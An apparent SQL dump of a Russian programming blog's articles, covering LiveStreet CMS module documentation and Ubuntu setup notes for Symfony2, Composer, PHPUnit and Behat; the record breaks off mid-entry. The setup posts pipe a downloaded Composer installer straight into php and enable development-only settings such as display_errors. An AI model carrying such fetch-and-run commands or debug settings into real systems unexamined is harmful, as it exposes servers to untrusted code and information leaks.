языковыми файлами\r\n */\r\n$config[''lang''][''path'']    = ''___path.root.server___/templates/language'';\r\n/**\r\n * Если установлена true, то модуль будет автоматически удалять из языковых конструкций переменные вида %%var%%, по которым не была произведена замена\r\n */\r\n$config[''module''][''lang''][''delete_undefined''] = true;\r\n?--></pre>\r\n\r\n<p>При использовании кеширования с memcache, текстовки кешируются в памяти на 1 час. Основные методы модуля:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Устанавливает текущий язык текстовок\r\n * $sLang - язык текстовок, например, ''russian''\r\n */\r\nfunction SetLang($sLang)\r\n\r\n/**\r\n * Возвращает текущий язык текстовок\r\n */\r\nfunction GetLang()\r\n\r\n/**\r\n * Возвращает дефолтный язык текстовок\r\n */\r\nfunction GetLangDefault()\r\n\r\n/**\r\n * Возвращает полный список загруженных текстовок\r\n */\r\nfunction GetLangMsg()\r\n\r\n/**\r\n * Возвращает текстовку по её имени\r\n * $sName - имя текстовки\r\n * $aReplace - массив для замены шаблонов в текстовке. Например, array(''login''=-->&#39;Ivan&#39;) заменит %%login%% на &#39;Ivan&#39;\r\n */\r\nfunction Get($sName,$aReplace=array())\r\n\r\n/**\r\n * Добавляет к текстовках новые тексты из массива\r\n * $aMessages - массив текстовок, например, array(&#39;new_text&#39;=&gt;&#39;new text&#39;)\r\n */\r\nfunction AddMessages($aMessages)\r\n\r\n/**\r\n * Добавлет новую текстовку\r\n * $sKey - имя текстовки\r\n * $sMessage - значение текстовки, т.е. сам текст\r\n */\r\nfunction AddMessage($sKey, $sMessage)\r\n?&gt;</pre>\r\n\r\n<h3 id="Logger">Logger</h3>\r\n\r\n<p>Модуль логирования. Позволяет вести логи каких-либо действий. Все логи хранятся в каталоге&nbsp;<strong>/logs/</strong>. В конфиге определяется имя файла лога по умолчанию:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Файл лога относительно каталога /logs/\r\n */\r\n$config[''sys''][''logs''][''file''] = ''log.log'';\r\n?--></pre>\r\n\r\n<p>Логгер поддерживает 3 уровня логирования по возрастающему приоритету:&nbsp;<strong>&#39;DEBUG</strong>&#39;,<strong>&#39;NOTICE</strong>&#39; и&nbsp;<strong>&#39;ERROR</strong>&#39;. Логирование происходит только тогда, кода установленный уровень логирования&nbsp;<strong>больше либо равен</strong>&nbsp;уровню текущей записи в лог. Основные методы модуля:</p>\r\n\r\n<pre>\r\n<!--?php\r\n/**\r\n * Устанавливает уровень логирования\r\n * $level - число от 0 до 2, либо название уровня логирования: ''DEBUG'',''NOTICE'',''ERROR''\r\n */\r\nfunction SetWriteLevel($level)\r\n\r\n/**\r\n * Возвращет уровень логирования в виде числа: 0 - ''DEBUG'', 1 - ''NOTICE'', 2 - ''ERROR''\r\n */\r\nfunction GetWriteLevel()\r\n\r\n/**\r\n * Использовать трассировку или нет. Позволяет опредлить место вызова записи в лог. \r\n * $bool - true | false\r\n */\r\nfunction SetUseTrace($bool)\r\n\r\n/**\r\n * Возвращает используется трассировка или нет\r\n */\r\nfunction GetUseTrace()\r\n\r\n/**\r\n * Использовать ротацию логов или нет. При превышении максимальное размера файл лога переименовывается в ''filename.1.log''  \r\n * $bool - true | false\r\n */\r\nfunction SetUseRotate($bool)\r\n\r\n/**\r\n * Возвращет используется ротаци логов или нет\r\n */\r\nfunction GetUseRotate()\r\n\r\n/**\r\n * Устанавливает файл лога\r\n * $sFile - имя файла относительно каталога /logs/\r\n */\r\nfunction SetFileName($sFile)\r\n\r\n/**\r\n * Возвращет имя файл лога\r\n */\r\nfunction GetFileName()\r\n\r\n/**\r\n * Производит запись в лог с уровнем логирования ''DEBUG''\r\n */\r\nfunction Debug($msg)\r\n\r\n/**\r\n * Производит запись в лог с уровнем логирования ''ERROR''\r\n */\r\nfunction Error($msg)\r\n\r\n/**\r\n * Производит запись в лог с уровнем логирования ''NOTICE''\r\n */\r\nfunction Notice($msg)\r\n?--></pre>\r\n\r\n<h3 id="Mail">Mail</h3>\r\n\r\n<p>Модуль для отправки почты на e-mail адреса. Для реализации отправки почты модуль использует библиотеку&nbsp;<strong>phpMailer</strong>&nbsp;(/engine/lib/external/phpMailer/). Настройки модуля в конфиге:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Тип отправки e-mail. Значения: "mail", "sendmail" или "smtp"\r\n */\r\n$config[''sys''][''mail''][''type''] = ''mail'';\r\n/**\r\n * Адрес с которого отправлять уведомления\r\n */\r\n$config[''sys''][''mail''][''from_email''] = ''rus.engine@gmail.com'';\r\n/**\r\n * Имя  с которого отправлять уведомления\r\n */\r\n$config[''sys''][''mail''][''from_name''] = ''Почтовик LiveStreet'';\r\n/**\r\n * Кодировка писем\r\n */\r\n$config[''sys''][''mail''][''charset''] = ''UTF-8'';\r\n/**\r\n * Настроки SMTP типа отправки почты\r\n */\r\n$config[''sys''][''mail''][''smtp''][''host''] = ''localhost'';\r\n$config[''sys''][''mail''][''smtp''][''port''] = 25;\r\n$config[''sys''][''mail''][''smtp''][''user''] = '''';\r\n$config[''sys''][''mail''][''smtp''][''password''] = '''';\r\n$config[''sys''][''mail''][''smtp''][''auth''] = true;\r\n?--></pre>\r\n\r\n<p>Основные методы модуля:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Устанавливает тему письма\r\n * $sText - текст темы письма\r\n */\r\nfunction SetSubject($sText)\r\n\r\n/**\r\n * Устанавливает текст письма\r\n * $sText - текст содержания письма\r\n */\r\nfunction SetBody($sText)\r\n\r\n/**\r\n * Добавлет к получателям новый адрес\r\n * $sMail - e-mail адрес получателя\r\n * $sName - имя получателя \r\n */\r\nfunction AddAdress($sMail,$sName=null)\r\n\r\n/**\r\n * Устанавливает одного получателя\r\n * $sMail - e-mail адрес получателя\r\n * $sName - имя получателя \r\n */\r\nfunction SetAdress($sMail,$sName=null)\r\n\r\n/**\r\n * Очищает список всех получателей\r\n */\r\nfunction ClearAddresses()\r\n\r\n/**\r\n * Устанавливает режим отправки письма как HTML\r\n */\r\nfunction setHTML()\r\n\r\n/**\r\n * Устанавливает режим отправки письма как plain text\r\n */\r\nfunction setPlain()\r\n\r\n/**\r\n * Отправляет письмо\r\n * Возвращает true в случае успешной отправки\r\n */\r\nfunction Send()\r\n?--></pre>\r\n\r\n<p>Пример отправки почты:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n$this--->Mail_SetAdress(&#39;user@domain.com&#39;,&#39;Ivan&#39;);\r\n$this-&gt;Mail_SetSubject(&#39;Test mail&#39;);\r\n$this-&gt;Mail_SetBody(&#39;Hello, <b>Ivan!</b>&#39;);\r\n$this-&gt;Mail_setHTML();\r\n$this-&gt;Mail_Send();\r\n?&gt;</pre>\r\n\r\n<h3 id="Message">Message</h3>\r\n\r\n<p>Модуль обработки системных сообщений. Необходим для отображения пользователю каких-либо информационных сообщений. Поддерживается две очереди сообщений - сообщения об ошибке и информационные сообщения. Сообщения могут отображаться как в текущем сеансе, так и при следующем обращении к сайту (использование сессионных сообщений). При завершении работы модуля он передает массивы (очереди) сообщений в шаблон:&nbsp;<strong>$aMsgError</strong>&nbsp;и&nbsp;<strong>$aMsgNotice</strong>. Основные методы модуля:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Добавляет в очередь новое сообщение об ошибке\r\n * $sMsg - текст сообщения\r\n * $sTitle - заголовок сообщения\r\n * $bUseSession - если true, то сообщение будет сохранено в сессии и показанно пользователю только при следующем обращении к сайту\r\n */\r\nfunction AddError($sMsg,$sTitle=null,$bUseSession=false)\r\n\r\n/**\r\n * Добавляет новое сообщение об ошибке, предварительно очищает всю очередь\r\n * $sMsg - текст сообщения\r\n * $sTitle - заголовок сообщения\r\n * $bUseSession - сохранять в сессии или нет\r\n */\r\nfunction AddErrorSingle($sMsg,$sTitle=null,$bUseSession=false)\r\n\r\n/**\r\n * Добавляет в очередь новое сообщение\r\n * $sMsg - текст сообщения\r\n * $sTitle - заголовок сообщения\r\n * $bUseSession - сохранять в сессии или нет\r\n */\r\nfunction AddNotice($sMsg,$sTitle=null,$bUseSession=false)\r\n\r\n/**\r\n * Добавляет новое сообщение, предварительно очищает всю очередь\r\n * $sMsg - текст сообщения\r\n * $sTitle - заголовок сообщения\r\n * $bUseSession - сохранять в сессии или нет\r\n */\r\nfunction AddNoticeSingle($sMsg,$sTitle=null,$bUseSession=false)\r\n\r\n/**\r\n * Возвращает очередь (массив) сообщений об ошибке\r\n */\r\nfunction GetError()\r\n\r\n/**\r\n * Возвращает очередь (массив) сообщений\r\n */\r\nfunction GetNotice() \r\n\r\n/**\r\n * Возвращает очередь (массив) сообщений об ошибке сохраненых в сессии\r\n */\r\nfunction GetErrorSession()\r\n\r\n/**\r\n * Возвращает очередь (массив) сообщений сохраненых в сессии\r\n */\r\nfunction GetNoticeSession()\r\n?--></pre>\r\n\r\n<h3 id="Security">Security</h3>\r\n\r\n<p>Модуль безопасности. На данный момент проверяет только корректность отправленных данных серверу. Для этого перед обработкой данных необходимо вызвать метод:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Проводит валидацию отправленных данных\r\n */\r\nfunction ValidateSendForm()\r\n?--></pre>\r\n\r\n<p>Этот метод вернет true только в том случае, если при отправке данных был передан правильный ключ (GET/POST параметр&nbsp;<strong>security_ls_key</strong>&nbsp;). Данный параметр (ключ) автоматически прогружается в шаблон с именем&nbsp;<strong>$LIVESTREET_SECURITY_KEY</strong>. Данный параметр уникальный для каждой PHP сессии, т.е. фактически уникальный для каждого пользователя. В конфиге определяется &quot;соль&quot; для генерации ключа:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * "Соль" к строке, хешируемой в качестве security ключа\r\n */\r\n$config[''module''][''security''][''hash'']  = "livestreet_security_key";\r\n?--></pre>\r\n\r\n<p>Использование данного модуля предотвращает возможность &quot;фоновой&quot; отправки форм/данных при посещении пользователем злонамеренных сайтов.</p>\r\n\r\n<h3 id="Session">Session</h3>\r\n\r\n<p>Модуль для работы с PHP сессиями. Поддерживает два механизма работы: через стандартных механизм PHP сессий и через собственный. Второй вариант до конца не протестирован, поэтому строго рекомендуется использовать первый, т.е. через стандартные сессии. Настройки модуля в конфиге:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Использовать или нет стандартный механизм сессий\r\n */\r\n$config[''sys''][''session''][''standart''] = true;\r\n/**\r\n * Название сессии\r\n */\r\n$config[''sys''][''session''][''name''] = ''PHPSESSID'';\r\n/**\r\n * Тайм-аут сессии в секундах\r\n */\r\n$config[''sys''][''session''][''timeout''] = null;\r\n/**\r\n * Хост сессии в куках\r\n */\r\n$config[''sys''][''session''][''host''] = ''___sys.cookie.host___'';\r\n/**\r\n * Путь сессии в куках\r\n */\r\n$config[''sys''][''session''][''path''] = ''___sys.cookie.path___'';\r\n?--></pre>\r\n\r\n<p>Основные методы модуля:</p>\r\n\r\n<pre>\r\n<!--?php\r\n/**\r\n * Возвращает идентификатор сессии\r\n */\r\nfunction GetId()\r\n\r\n/**\r\n * Возвращает значение из сессии\r\n * $sName - имя параметра\r\n */\r\nfunction Get($sName)\r\n\r\n/**\r\n * Устанавливает значение параметра в сессии\r\n * $sName - имя параметра\r\n * $data - данные параметра\r\n */\r\nfunction Set($sName,$data)\r\n\r\n/**\r\n * Удаляет значение параметра из сессии\r\n * $sName - имя параметра\r\n */\r\nfunction Drop($sName)\r\n\r\n/**\r\n * Возвращает сразу все данные сессии в виде ассоциативного массива\r\n */\r\nfunction GetData()\r\n\r\n/**\r\n * Удаляет все данные из сессии и завершает сессию\r\n */\r\nfunction DropSession()\r\n?--></pre>\r\n\r\n<h3 id="Text">Text</h3>\r\n\r\n<p>Модуль обработки и типографирования текста. Модуль использует библиотеку типографа Jevix (/engine/lib/external/Jevix/). Основная задача модуля - это удаление из текста недопустимых HTML тегов и фильтрация на вставку JavaScript. Основные методы модуля:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Парсит текст и возвращает результат\r\n * $sText - исходный текст\r\n */\r\nfunction Parser($sText)\r\n\r\n/**\r\n * Парсит текст используя только Jevix\r\n * $sText - исходный текст\r\n */\r\nfunction JevixParser($sText,&amp;$aError=null)\r\n\r\n/**\r\n * Парсит текст используя замену тега <video-->. Поддерживает обработку youtube.com и rutube.ru\r\n * $sText - исходный текст\r\n */\r\nfunction VideoParser($sText)\r\n\r\n/**\r\n * Заменяет в тексте тег  на </pre>\r\n\r\n<pre>\r\n<!--рre-->для подстветки через JavaScript * $sText - исходный текст */ function CodeSourceParser($sText) /** * Производить резрезание текста по тегу <cut>. * $sText - исходный текст * Возвращаем массив вида: * array( * $sTextShort - текст до тега <cut> * $sTextNew - весь текст за исключением удаленного тега * $sTextCut - именованное значение <cut name="read more"> * ) */ function Cut($sText) ?&gt;</cut></cut></cut></pre>', NULL, 0, NULL, '2012-09-23 16:27:51');
INSERT INTO `articles` (`id`, `title`, `slug`, `text`, `image`, `publish`, `weight`, `created_at`) VALUES
(72, 'Экшены (Action) LiveStreet', 'ekshieny-action-livestreet', '<p>Экшены (Action) предназначены для обработки определенных URL. Например при запросе&nbsp;<strong>http://site.com/action_name/event_name/</strong>&nbsp;будет запущен экшен с именем&nbsp;<strong>action_name</strong>. Соответствие имени экшена и его класса определяется в&nbsp;<a href="http://web.archive.org/web/20100724120349/http://trac.lsdev.ru/livestreet/wiki/DeveloperDoc/Router#Конфигроутинга">конфиге роутинга</a>. Классы экшенов расположены в каталоге&nbsp;<strong>/classes/actions/</strong>&nbsp;и наследуются от класса&nbsp;<strong>Action</strong>(/engine/classes/Action.class.php). Название файла экшена должно формироваться из названия класса, например, для класса&nbsp;<strong>ActionTest</strong>&nbsp;файл будет иметь имя&nbsp;<strong>ActionTest.class.php</strong>. При запуске экшен пытается найти необходимый эвент по&nbsp;<strong>event_name</strong>&nbsp;и если находит, то запускает его. Эвент представляет из себя обычный метод класса, которому определено соответствие с именем эвента, в нашем примере это&nbsp;<strong>event_name</strong>. <!--more--> Пример простого экшена:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\nclass ActionTest extends Action {\r\n        /**\r\n         * Инициализация экшена\r\n         *\r\n         */\r\n        public function Init() {                \r\n                $this-&gt;SetDefaultEvent(&#39;index&#39;);                \r\n        }\r\n        /**\r\n         * Регистрация эвентов\r\n         *\r\n         */\r\n        protected function RegisterEvent() {\r\n                $this-&gt;AddEvent(&#39;index&#39;,&#39;EventIndex&#39;);\r\n                $this-&gt;AddEvent(&#39;edit&#39;,&#39;EventEdit&#39;);            \r\n        }\r\n        /**\r\n         * Метод эвуента index\r\n         *\r\n         */\r\n        protected function EventIndex() {               \r\n                $this-&gt;SetTemplateAction(&#39;index&#39;);\r\n        }\r\n        /**\r\n         * Метод эвента edit\r\n         *\r\n         */\r\n        protected function EventEdit() {\r\n                $this-&gt;Viewer_Assign(&#39;iSomeNumber&#39;,12345);\r\n                $this-&gt;SetTemplateAction(&#39;some_tamplate&#39;);\r\n        }       \r\n        /**\r\n         * Вызывается автоматически после выполнения эвента\r\n         *\r\n         */\r\n        public function EventShutdown() {\r\n                $this-&gt;Viewer_Assign(&#39;sText&#39;,&#39;Event complete&#39;);\r\n        }\r\n}</code></pre>\r\n\r\n<p>В данном примере мы создаем экшен&nbsp;<strong>ActionTest</strong>&nbsp;с двумя эвентами:&nbsp;<strong>index</strong>&nbsp;и&nbsp;<strong>edit</strong>. Обязательные методы, которые должны присутствовать в любом экшене, это&nbsp;<strong>Init()</strong>&nbsp;и&nbsp;<strong>RegisterEvent()</strong>, в первом происходит инициализация экшена, например, установка дефолтного эвента, а во втором регистрация всех используемых эвентов в данном экшене. Также предусмотрены два дополнительных метода, которые определять не обязательно, это<strong>EventShutdown()</strong>&nbsp;и&nbsp;<strong>EventNotFound()</strong>, первый автоматически вызывается после выполнения текущего эвента, второй вызывается в том случаи, если не найден необходимый эвент. По умолчанию&nbsp;<strong>EventNotFound()</strong>&nbsp;переадресует управление на экшен&nbsp;<strong>error</strong>, который показывает 404 HTTP ошибку:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\nprotected function EventNotFound() {\r\n        $this-&amp;gt;Message_AddErrorSingle($this-&gt;Lang_Get(&#39;system_error_404&#39;),&#39;404&#39;);\r\n        return Router::Action(&#39;error&#39;);\r\n}</code></pre>\r\n\r\n<h2 id="ЭвентыEvent">Эвенты (Event)</h2>\r\n\r\n<p>Регистрация евентов происходит в методе&nbsp;<strong>RegisterEvent()</strong>, существует два способа зарегистрировать евент, это&nbsp;<strong>AddEvent()</strong>&nbsp;и&nbsp;<strong>AddEventPreg()</strong>, второй использует для этого регулярные выражения. Регистрация евентов:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\n// Стандартный способ\r\n$this-&gt;AddEvent(&#39;event_name&#39;,&#39;EventMethod&#39;);\r\n\r\n// Через регулярные выражение\r\n/**\r\n* соответствует site.com/action/123.html и site.com/action/123.html/blabla/\r\n*/\r\n$this-&gt;AddEventPreg(&#39;/^(\\d+)\\.html$/i&#39;,&#39;EventMethod&#39;);\r\n\r\n/**\r\n* соответствует site.com/action/123.html, но не соответствует site.com/action/123.html/blabla/\r\n*/\r\n$this-&gt;AddEventPreg(&#39;/^(\\d+)\\.html$/i&#39;,&#39;/^$/i&#39;,&#39;EventMethod&#39;);\r\n\r\n/**\r\n* соответствует site.com/action/123/, site.com/action/123/page1/ ,\r\n* но не соответствует site.com/action/123/blabla/\r\n*/\r\n$this-&gt;AddEventPreg(&#39;/^(\\d+)$/i&#39;,&#39;/^(page\\d+)?$/i&#39;,&#39;/^$/i&#39;,&#39;EventMethod&#39;);</code></pre>\r\n\r\n<p>В примерах выше при запросе правильного URL будет вызван метод&nbsp;<strong>EventMethod()</strong>, в противном случаи метод&nbsp;<strong>EventNotFound()</strong>. В&nbsp;<strong>AddEvent(&#39;event_name&#39;,&#39;EventMethod&#39;)</strong>&nbsp;первый аргумент определяет имя эвента, а второй метод, который будет вызван. В&nbsp;<strong>AddEventPreg(&#39;/^(\\d+)\\.html$/i&#39;,&#39;/^$/i&#39;,&#39;EventMethod&#39;)</strong>первый параметр определят регулярное выражение для имени эвента, а второй и последующие (кроме последнего) регулярное выражение для параметров. Последний параметр определят название метода для вызова. После выполнения эвента в браузер выводится шаблон, по умолчанию совпадающий с именем эвента. Например, для эвента&nbsp;<strong>AddEvent(&#39;event_name&#39;,&#39;EventMethod&#39;)</strong>&nbsp;будет использоваться шаблон&nbsp;<strong>event_name.tpl</strong>, расположенный в&nbsp;<strong>/templates/skin/skin_name/actions/ActionTest/</strong>, где&nbsp;<strong>skin_name</strong>&nbsp;название скина(общего шаблона), а&nbsp;<strong>ActionTest</strong>&nbsp;название класса экшена в котором зарегистрирован эвент. Шаблон этот можно переопределить используя метод&nbsp;<strong>SetTemplateAction(&#39;some_tamplate&#39;)</strong>, в таком случаи будет использован шаблон&nbsp;<strong>/templates/skin/skin_name/actions/ActionTest/some_tamplate.tpl</strong>. Также есть возможность из одного эвента передать управление на другой (внутренний реврайт), или даже на другой экшен. Делается это с помощью роутера:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\nprotected function EventEdit() {\r\n        // некоторый код\r\n        //.....\r\n\r\n        return Router::Action(&#39;test&#39;,&#39;edit&#39;);\r\n}</code></pre>\r\n\r\n<p>В данном примере передается управление в экшен&nbsp;<strong>test</strong>&nbsp;с эвентом&nbsp;<strong>edit</strong>, т.е. происходит эмуляция URL&nbsp;<strong>http://site.com/test/edit/</strong>. Для передачи в шаблон каких-либо данный используется метод&nbsp;<strong>Assign($sName,$value)</strong>&nbsp;системного модуля&nbsp;<strong>Viewer</strong>, где&nbsp;<strong>$sName</strong>&nbsp;будущее имя переменной в шаблоне, а&nbsp;<strong>$value</strong>&nbsp;её значение:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\n$this-&gt;Viewer_Assign(&#39;iSomeNumber&#39;,12345);</code></pre>\r\n\r\n<h2 id="ДоступныеметодыAction">Доступные методы Action</h2>\r\n\r\n<ul>\r\n	<li><strong>AddEvent($sEventName,$sEventFunction)</strong>&nbsp;- регистрация эвента по имени</li>\r\n	<li><strong>AddEventPreg($sEventPregName,..,$sParamPregN,..,$sEventFunction)</strong>&nbsp;- регистрация евента через регулярные выражения</li>\r\n	<li><strong>SetDefaultEvent($sEvent)</strong>&nbsp;- устанавливает эвент по умолчанию, т.е. тот который будет вызван при URL&nbsp;<strong>http://site.com/action/</strong>. Данные метод должен вызываться из метода<strong>Init()</strong></li>\r\n	<li><strong>GetDefaultEvent()</strong>&nbsp;- возвращает эвент по умолчанию, например,&nbsp;<strong>index</strong></li>\r\n	<li><strong>GetEventMatch($iItem=null)</strong>&nbsp;- возвращает элемент совпадения евента по регулярному выражению. Например, если для евента&nbsp;<strong>AddEventPreg(&#39;/^(page(\\d+))$/i&#39;,&#39;EventMethod&#39;)</strong>вызвать метод&nbsp;<strong>GetEventMatch(2)</strong>, то он вернет числовое значение равное номеру страницы</li>\r\n	<li><strong>GetParamEventMatch($iParamNum,$iItem=null)</strong>&nbsp;- возвращает элемент совпадения по регулярному выражению для параметров евента. Например, если для евента<strong>AddEventPreg(&#39;/^blog$/i&#39;,&#39;/^new$/&#39;,&#39;/^page(\\d+)$/i&#39;,&#39;EventMethod&#39;)</strong>&nbsp;вызвать метод&nbsp;<strong>GetParamEventMatch(1,1)</strong>, то он вернет числовое значение равное номеру страницы</li>\r\n	<li><strong>GetParam($iOffset,$default=null)</strong>&nbsp;- возвращает параметр по его номеру/смещению, $default определяет дефолтное значение в случаи если параметра не существует. Например, для&nbsp;<strong>http://site.com/user/ort/edit/fast/</strong>&nbsp;GetParam(0) вернет значение&nbsp;<strong>edit</strong></li>\r\n	<li><strong>GetParams()</strong>&nbsp;- возвращает массив текущих параметров, которые были переданные через URL. Например, для&nbsp;<strong>http://site.com/user/ort/edit/fast/</strong>&nbsp;вернет значение&nbsp;<strong>array(&#39;edit&#39;,&#39;fast&#39;)</strong></li>\r\n	<li><strong>SetParam($iOffset,$value)</strong>&nbsp;- устанавливает значение параметра, например,&nbsp;<strong>SetParam(0,&#39;add&#39;)</strong></li>\r\n	<li><strong>SetTemplate($sTemplate)</strong>&nbsp;- устанавливает шаблон для вывода, используя путь относительно общего каталога шаблонов. Например,&nbsp;<strong>SetTemplate(&#39;index.tpl&#39;)</strong>&nbsp;указывает на шаблон&nbsp;<strong>/templates/skin/skin_name/index.tpl</strong></li>\r\n	<li><strong>SetTemplateAction($sTemplate)</strong>&nbsp;- устанавливает шаблон для вывода, используя путь относительно каталога шаблонов экшена. Например,&nbsp;<strong>SetTemplateAction(&#39;index&#39;)</strong>указывает на шаблон&nbsp;<strong>/templates/skin/skin_name/actions/ActionTest/index.tpl</strong>. Внимание! При указании шаблона использовать расширение&nbsp;<strong>.tpl</strong>&nbsp;не нужно!</li>\r\n	<li><strong>GetTemplate()</strong>&nbsp;- возвращает пусть до шаблона относительно общего каталога шаблонов, например,&nbsp;<strong>actions/ActionTest/index.tpl</strong></li>\r\n	<li><strong>GetActionClass()</strong>&nbsp;- возвращает имя класса экшена, например,&nbsp;<strong>ActionTest</strong></li>\r\n</ul>', NULL, 1, NULL, '2012-09-24 15:03:11'),
(73, 'Setup environment for Symfony2 - Настройка окружения для Symfony2 на Ubuntu 12.04', 'setup-environment-for-symfony2-nastroika-okruzhieniia-dlia-symfony2-na-ubuntu-12-04', '<p>Вкратце описание настройки среды для разработки на фреймворке <strong>Symfony2</strong> <!--more--></p>\r\n\r\n<pre>\r\n<code class="bash">sudo su\r\napt-get install mysql-server mysql-client\r\napt-get install apache2\r\napt-get install php5 libapache2-mod-php5\r\n/etc/init.d/apache2 restart\r\napt-get install php5-mysql php5-curl php5-gd php5-intl php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-ming php5-ps php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl php5-xdebug\r\n/etc/init.d/apache2 restart</code></pre>\r\n\r\n<p>Устанвливаем MongoDB если нужно:</p>\r\n\r\n<pre>\r\n<code class="bash">pecl install mongo</code></pre>\r\n\r\n<p>Туториал по установке <a href="http://docs.mongodb.org/manual/tutorial/install-mongodb-on-ubuntu/" target="_blank">здесь</a></p>\r\n\r\n<pre>\r\n<code class="bash">apt-get install php-apc</code></pre>\r\n\r\n<pre>\r\n<code class="bash">gedit /etc/apache2/sites-available/default</code></pre>\r\n\r\n<p>Заменяем все AllowOverride None на AllowOverride All</p>\r\n\r\n<pre>\r\n<code class="bash">a2enmod rewrite\r\n/etc/init.d/apache2 restart\r\npecl install xdebug\r\napt-get install phpmyadmin\r\napt-get install git-core</code></pre>\r\n\r\n<p>Не забудьте после этого прописать некоторые настройки в php.ini Для начала найдем куда установился xdebug:</p>\r\n\r\n<pre>\r\n<code class="bash">find / -name &#39;xdebug.so&#39; 2&gt; /dev/null</code></pre>\r\n\r\n<p>Теперь с имеющимися данными идем в php.ini</p>\r\n\r\n<pre>\r\n<code class="bash">gedit /etc/php5/apache2/php.ini</code></pre>\r\n\r\n<pre>\r\n<code class="ini">    extension=mongo.so\r\n\r\n;xDebug Configuration starts\r\n   zend_extension=/usr/lib/php5/20100525/xdebug.so\r\n   xdebug.max_nesting_level=250\r\n   xdebug.var_display_max_depth=10\r\n   xdebug.remote_enable=true\r\n   xdebug.remote_handler=dbgp\r\n   xdebug.remote_mode=req\r\n   xdebug.remote_port=9000\r\n   xdebug.remote_host=127.0.0.1\r\n   xdebug.idekey=phpstorm-xdebug\r\n   xdebug.remote_autostart=1\r\n   xdebug.remote_log=/var/log/apache2/xdebug_remote.log\r\n;xDebug Configuration ends</code></pre>\r\n\r\n<p>В том же php.ini необходимо изменить:</p>\r\n\r\n<pre>\r\n<code class="ini">;date.timezone =</code></pre>\r\n\r\n<p>на</p>\r\n\r\n<pre>\r\n<code class="ini">date.timezone = Europe/Kiev</code></pre>\r\n\r\n<pre>\r\n<code class="ini">short_open_tag = On</code></pre>\r\n\r\n<p>на</p>\r\n\r\n<pre>\r\n<code class="ini">short_open_tag = Off</code></pre>\r\n\r\n<pre>\r\n<code class="ini">display_errors = Off</code></pre>\r\n\r\n<p>на</p>\r\n\r\n<pre>\r\n<code class="ini">display_errors = On</code></pre>\r\n\r\n<pre>\r\n<code class="ini">html_errors = Off</code></pre>\r\n\r\n<p>на</p>\r\n\r\n<pre>\r\n<code class="ini">html_errors = On</code></pre>\r\n\r\n<p>На свое усмотрение можно изменить параметры: max_execution_time memory_limit post_max_size upload_max_filesize</p>\r\n\r\n<pre>\r\n<code class="bash">/etc/init.d/apache2 restart</code></pre>\r\n\r\n<p>Теперь если все гуд вот этот файл - <a href="http://kotoblog.pp.ua/wp-content/uploads/2012/11/check_gh.php_.zip">check_gh.php</a> будет зелёненьким. Continue...</p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install curl\r\ncurl -sS https://getcomposer.org/installer | php\r\nmv composer.phar /usr/local/bin/composer</code></pre>\r\n\r\n<p>Также для того чтобы компосер знал что у нас установлена монга нужно это указать в php.ini для cli. В файл:</p>\r\n\r\n<pre>\r\n<code class="bash">gedit /etc/php5/cli/php.ini</code></pre>\r\n\r\n<p>нужно добавить</p>\r\n\r\n<pre>\r\n<code class="ini">extension=mongo.so</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2012-11-12 22:19:41'),
(74, 'Установка Composer в Ubuntu 12.04', 'ustanovka-composer-v-ubuntu-12-04', '<p>Правильно устанавливать так:</p>\r\n\r\n<pre>\r\n<code class="bash">curl -s https://getcomposer.org/installer | php\r\nsudo mv composer.phar /usr/local/bin/composer</code></pre>\r\n\r\n<p>Теперь вместо</p>\r\n\r\n<pre>\r\n<code class="bash">php composer.phar install</code></pre>\r\n\r\n<p>Мы будем писать</p>\r\n\r\n<pre>\r\n<code class="bash">composer install</code></pre>\r\n\r\n<p>Ну и в дальнейшем также. Согласитесь так же намного проще :)</p>', NULL, 1, NULL, '2012-11-12 22:24:16'),
(75, 'PhpUnit Ubuntu 12.04', 'phpunit-ubuntu-12-04', '<pre>\r\n<code class="bash">sudo apt-get remove phpunit \r\nsudo pear channel-discover pear.phpunit.de \r\nsudo pear channel-discover pear.symfony-project.com \r\nsudo pear channel-discover components.ez.no \r\nsudo pear update-channels \r\nsudo pear upgrade-all \r\nsudo pear install --alldeps phpunit/PHPUnit sudo pear install --force --alldeps pear.phpunit.de/PHPUnit</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2013-01-02 13:22:53'),
(76, 'Behat + Mink + Symfony 2.1', 'behat-mink-symfony-2-1', '<p>composer.json:</p>\r\n\r\n<pre>\r\n<code class="json">{\r\n  ...\r\n  &quot;require-dev&quot;: {\r\n        &quot;behat/behat&quot;: &quot;@dev&quot;,\r\n        &quot;behat/mink&quot;: &quot;@dev&quot;,\r\n        &quot;behat/symfony2-extension&quot;: &quot;dev-master&quot;,\r\n        &quot;behat/mink-extension&quot;: &quot;*&quot;,\r\n        &quot;behat/mink-selenium2-driver&quot;: &quot;dev-master&quot;,\r\n        &quot;behat/mink-browserkit-driver&quot;: &quot;dev-master&quot;,\r\n        &quot;behat/mink-sahi-driver&quot;: &quot;@dev&quot;\r\n    },  \r\n  ...\r\n}</code></pre>\r\n\r\n<p>composer update --dev ./behat.yml:</p>\r\n\r\n<pre>\r\n<code>default:\r\n  extensions:\r\n    Behat\\Symfony2Extension\\Extension:\r\n        mink_driver: true\r\n    Behat\\MinkExtension\\Extension:\r\n        default_session: 